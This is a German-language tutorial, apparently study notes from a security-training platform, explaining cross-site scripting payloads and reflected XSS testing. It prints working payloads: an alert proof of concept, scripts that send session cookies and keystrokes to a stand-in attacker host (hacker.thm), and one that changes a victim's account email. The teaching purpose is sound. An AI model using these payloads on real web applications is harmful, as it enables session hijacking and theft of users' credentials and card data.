Cross-Site Scripting, in der Cybersecurity-Community besser bekannt als XSS, wird als Injektionsangriff eingestuft, bei dem bösartiges JavaScript in eine Webanwendung eingeschleust wird, mit der Absicht, von anderen Benutzern ausgeführt zu werden.

##### Was ist eine XSS Payload?

Bei XSS Schwachstellen handelt es sich bei der Payload um Java Script Code der auf der Zielmaschine ausgeführt werden soll. 
Die Payload wird in zwei Teile Aufgeteilt. Die Intention und die Modification. 

Die Intention ist das was das Java Script tatsächlich tun soll, und die Modifikation ist die Änderung des Codes die wir brauchen damit der Code ausgeführt wird.

Hier ein paar beispiele zu XSS Intentions: 

PoC (Proof of Concept):
```
<script>alert('XSS');</script>
```
Das ist eine der Einfachsten Payloads, mit der Man demonstrieren möchte das es eine XSS Schwachstelle gibt. Diese Payload sorgt dafür das eine Alert Box sich öfnet mit einem Simplen Text String.

Session Stealing: 
```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
Da Deteils einer user Session meistens in den Cookies gespeichert werden, sorgt dieses Script dafür, dass die Cookies von dem Zielgerät genommen werden, Base64 verschlöüsselt werden und sendet sie dann an eine vom Hacker kontrollierte Website, um sie zu protokollieren. Sobald der Hacker diese Cookies hat, kann er die Sitzung der Zielperson übernehmen und als dieser Benutzer protokolliert werden.

KeyLogger
```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
Der Code Fungiert als Keylogger, d.h. alles was das Ziel auf der Website schreibt wird zu einem Server unter Kontrolle des Angreifers weitergeleitet. Das lohnt sich zum Beispiel bei Credit Karten Infos

Business Logic:
Diese Nutzlast ist sehr viel spezifischer als die obigen Beispiele. Hier geht es um den Aufruf einer bestimmten Netzwerkressource oder einer JavaScript-Funktion. Stellen Sie sich zum Beispiel eine JavaScript-Funktion zum Ändern der E-Mail-Adresse des Benutzers mit dem Namen `user.changeEmail()` vor. Ihr Payload könnte wie folgt aussehen:
```
<script>user.changeEmail('attacker@hacker.thm');</script>
```
Da nach Ausführung von diesem Script die Email Adresse des Accounts geändert wurde kann der Angreifer nun z.B. das Passwort wechseln


### Reflected XSS

Reflected XSS tritt auf, wenn vom Benutzer bereitgestellte Daten in einer HTTP-Anfrage ohne jegliche Validierung in den Webseiten-Quellcode aufgenommen werden.
Beispiel zur Erläuterung:_
Eine Website die bei Falschem Input eine Error Nachricht ANzeigt. Der Inhalt der Fehlermeldung wird aus dem Error parameter im Query-String übernommen und direkt in den Seitenquelltext eingebaut.
https://imgur.com/0Wq8biY
Die anwendung Kontrolliert den Inhalt des Error Parameters nicht, was dem Angreifer erlaubt hier Schad Code einzubauen. Dies könnte dann so aussehen:
https://imgur.com/4o5Z9Y3

##### Wie Teste ich auf Reflected XSS Schwachstellen?
Dazu muss man jeden möglichen Einstiegspunkt testen, z. B:
Parameter im URL Query String
URL-Dateipfad
Manchmal HTTP-Header (obwohl es unwahrscheinlich ist, dass sie in der Praxis ausgenutzt werden können)

Sobald man Daten gefunden hat, die in der Webanwendung widergespiegelt werden, muss man bestätigen, dass man seine JavaScript-Payload erfolgreich ausführen kann; die Payload hängt davon ab, wo in der Anwendung Ihr Code widergespiegelt wird 